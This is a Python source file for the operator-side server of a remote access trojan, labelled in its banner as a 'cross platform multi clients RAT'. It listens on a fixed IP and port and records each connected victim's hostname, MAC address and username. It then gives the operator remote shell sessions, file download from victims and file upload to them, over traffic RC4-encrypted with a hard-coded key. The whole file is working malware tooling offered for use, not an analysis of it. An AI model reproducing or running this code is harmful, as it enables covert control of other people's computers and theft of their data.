import socket
import json
import threading
import platform
import os
import base64

key ='qazwsxedqazwsxed'

def rc4_setup(key):
    if isinstance(key,str):
        key = key.encode()
    s = list(range(256))
    j = 0
    for i in range(256):
        j = (j + s[i] + key [i % len(key)]) % 256
        s[i],s[j] = s[j],s[i]
    return s
def rc4_crypt(data,key):
    if isinstance(data,str):
        data = data.encode()
    s = rc4_setup(key)
    i, j = 0, 0
    res = []
    for byte in data:
        i =(i +1)%256
        j =(j+s[i])%256
        s[i],s[j]=s[j],s[i]
        res.append(byte^s[(s[i]+ s[j])%256])

    # print("加解密后长度:",len(res))
    return bytes(res)

def Rc4_Encrypt(data,key):
    # print("加密前长度:",len(data))
    return rc4_crypt(data,key)
def Rc4_Decrypt(data,key):
    # print("解密前长度:",len(data))
    return rc4_crypt(data,key)


print("[*] Checking Requirements Module.....")
if platform.system().startswith("Windows"):
    try:
        from pystyle import *
    except ImportError:
        os.system("python -m pip install pystyle -q -q -q")
        from pystyle import *
elif platform.system().startswith("Linux"):
    try:
        from pystyle import *
    except ImportError:
        os.system("python3 -m pip install pystyle -q -q -q")
        from pystyle import *
banner = Center.XCenter(r"""
************************************************************************************
*                                                                                  *
*    ██████╗         ██╗  ██╗        ██████╗ ██╗   ██╗███████╗██╗   ██╗██████╗     *
*    ██╔══██╗ ██████╗██║  ██║        ██╔══██╗╚██╗ ██╔╝██╔════╝██║   ██║██╔══██╗    *
*    ██████╔╝██╔════╝███████║        ██████╔╝ ╚████╔╝ █████╗  ██║   ██║██║  ██║    *
*    ██╔══██╗██║     ╚════██║        ██╔═══╝   ╚██╔╝  ██╔══╝  ██║   ██║██║  ██║    *
*    ██║  ██║╚██████╗     ██║███████╗██║        ██║   ██║     ╚██████╔╝██████╔╝    *
*    ╚═╝  ╚═╝ ╚═════╝     ╚═╝╚══════╝╚═╝        ╚═╝   ╚═╝      ╚═════╝ ╚═════╝     *
*                                                                                  *
*                                               CROSS PLATFORM MULTI CLIENTS RAT   *
*                                                                Coded By: AiENG   *
************************************************************************************                       
""")
os.system("cls||clear")
print(Colorate.Vertical(Colors.green_to_yellow, banner, 2))
ips = []
client_usernames = {}
targets = []
connections = {}
def recv_data(target):
    data = b''
    while True:
        try:
            data = data + target.recv(1000000)#.decode().rstrip()
            if data != b'' or len(data) > 0:
                chunk = Rc4_Decrypt(data,key)
                ret = json.loads(str(chunk,encoding='utf-8').rstrip())
                return ret
        except ValueError:
            continue
def send_data(target, data):
    jsondata = json.dumps(data)
    encrypted_data = Rc4_Encrypt(jsondata.encode(), key)  # 加密数据
    target.send(encrypted_data)

def download_file(target, file_name):
    f = open(file_name, 'wb')
    target.settimeout(1)
    chunk = Rc4_Decrypt(target.recv(10000000),key)
    while chunk:
        f.write(chunk)
        try:
            chunk = Rc4_Decrypt(target.recv(10000000),key)
        except socket.timeout as e:
            break
    target.settimeout(None)
    f.close()
def upload_file(target, file_name):
    f = open(file_name, 'rb')
    data_to_send = f.read()
    encrypted_data = Rc4_Encrypt(data_to_send, key)  # 加密数据
    target.send(encrypted_data)
    f.close()
#coded By Machine1337....If u like the tool...Follow me on github: @machine1337
def shell(target, ip):
    while True:
        command = input(Colors.yellow+"\n[*] Shell@%s " % str(ip))
        send_data(target, command)
        if command == 'q':
            break
        if command == 'help':
            print(Colorate.Vertical(Colors.red_to_purple, """
             ****  SHELL COMMANDS MAIN MENU ****
             
    1. download filename  | Download File From Client
    2. upload filename    | upload file To the Client
    3. q                  | Back To The Server Main Menu 
    4. kill               | Terminate the client shell
                   More Features Will Be Added
                   Follow:- github.com/machine1337
                                """, 2))
        elif command[:8] == "download":
            download_file(target, command[9:])
        elif command[:6] == 'upload':
            upload_file(target, command[7:])
        elif command == 'kill':
            target.close()
            targets.remove(target)
            ips.remove(ip)
            break
        else:
            message = recv_data(target)
            print(message)

def server():
    global clients, connections
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    while True:
        if stop_threads:
            break
        s.settimeout(1)
        try:
            target, ip = s.accept()
            if ip[0] in connections:
                target.close()
            else:
                info = recv_data(target)
                hostname, mac_address, username = info.split(',')
                client_data = {'HostName': hostname, 'MAC_Address': mac_address, 'Username': username}
                client_usernames[ip[0]] = client_data
                targets.append(target)
                ips.append(ip)
                connections[ip[0]] = target
                print(Colors.green+"{} ({}:{}) has connected!".format(username, ip[0], ip[1])+"\n[*] Server Command (Type help):- ",end="")
                clients += 1
        except socket.timeout:
            continue
        except KeyboardInterrupt:
            break
    print(Colors.red+"\n[*] Server shutting down...")
    for target in targets:
        target.close()
    s.close()
def listclients():
    print("\n--------------------------------------------------------------------------------------")
    print("SESSIONS  |  HOSTNAME         |  MAC ADDRESS           | USERNAME         | IP ADDRESS")
    for count, ip in enumerate(ips):
        if ip[0] in client_usernames:
            target_info = client_usernames[ip[0]]
            print("{:<10}|{:<12}       {:<15}           {:<11}       {}:{}".format(count, target_info['HostName'],
                                                                                   target_info['MAC_Address'],
                                                                                   target_info['Username'], ip[0],
                                                                                   str(ip[1])))
        else:
            print(
                "{:<10}|{:<12}         {:<15}           {:<11}       {}:{}".format(count, 'Unknown', 'None', 'Unknown',
                                                                                   ip[0], str(ip[1])))
        count += 1
    print("---------------------------------------------------------------------------------------")
def selectclient():
    try:
        num = int(command[8:])
        tarnum = targets[num]
        tarip = ips[num]
        shell(tarnum, tarip)
    except:
        print(Colors.red+"\n[*] No session id under that number")
if __name__ == '__main__':
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("192.168.230.100", 4444))  # change ur ip and port here
    s.listen(5)
    clients = 0
    stop_threads = False
    print(Colors.yellow+"\n[*] Server Listening On: ")
    t1 = threading.Thread(target=server)
    t1.start()
    try:
        while True:
            command = input(Colorate.Vertical(Colors.green_to_yellow, "\n[*] Server Command (Type help):- ", 2))
            if command == "targets":
                listclients()
            elif command == "help":
                print(Colorate.Vertical(Colors.red_to_purple, """
                ****  SERVER COMMANDS MAIN MENU ****
    1. targets   ---> Display Connected Clients
    2. session   ---> go to specific client shell like session 0
    3. exit      ---> Terminate the server  
            """, 2))
            elif command[:7] == "session":
                selectclient()
            elif command == "exit":
                stop_threads = True
                t1.join()
                break
    except KeyboardInterrupt:
        stop_threads = True
        t1.join()
#coded By Machine1337....If u like the tool...Follow me on github: @machine1337
